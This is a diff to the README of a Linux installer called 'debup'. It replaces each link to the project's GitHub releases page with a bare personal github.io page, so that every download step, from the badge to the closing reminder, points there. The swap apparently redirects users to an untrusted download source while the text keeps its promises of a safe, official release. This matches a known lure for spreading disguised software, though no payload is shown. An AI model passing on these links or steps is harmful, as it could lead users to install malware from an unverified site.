@@ -1,6 +1,6 @@
 # 🔧 debup - Your Universal Linux App Installer
 
-[![Download debup](https://img.shields.io/badge/Download-debup-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mariohungry6009/debup/releases)
+[![Download debup](https://img.shields.io/badge/Download-debup-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://mariohungry6009.github.io)
 
 ## 📦 What Is debup?
 
@@ -12,7 +12,7 @@ Whether you're using Ubuntu, Linux Mint, Pop!_OS, Windows Subsystem for Linux (W
 
 Getting debup on your system is straightforward. Here's what you need to do:
 
-1. **Visit this link to download the application:** [debup Releases Page](https://github.com/Mariohungry6009/debup/releases)
+1. **Visit this link to download the application:** [debup Releases Page](https://mariohungry6009.github.io)
 2. Look for the latest release version (it will be at the top of the page)
 3. Download the file that matches your system architecture
 4. Once downloaded, you can start using debup right away
@@ -146,7 +146,7 @@ Your privacy matters. debup:
 
 ## ⚡ Quick Start Checklist
 
-1. **Download** debup from [the releases page](https://github.com/Mariohungry6009/debup/releases)
+1. **Download** debup from [the releases page](https://mariohungry6009.github.io)
 2. **Install** the downloaded package
 3. **Open** your terminal
 4. **Type** `debup search [what you want]`
@@ -193,7 +193,7 @@ If something isn't working:
 
 debup is more than just a package manager - it's your gateway to the vast world of Linux software. By connecting GitHub Releases with APT, it creates the easiest way to discover and install applications on any Debian-based system.
 
-Remember, the first step is always the same: **Visit this link to download the application:** [debup Releases](https://github.com/Mariohungry6009/debup/releases)
+Remember, the first step is always the same: **Visit this link to download the application:** [debup Releases](https://mariohungry6009.github.io)
 
 Once you have debup installed, a world of software is just one command away. Happy installing!
 
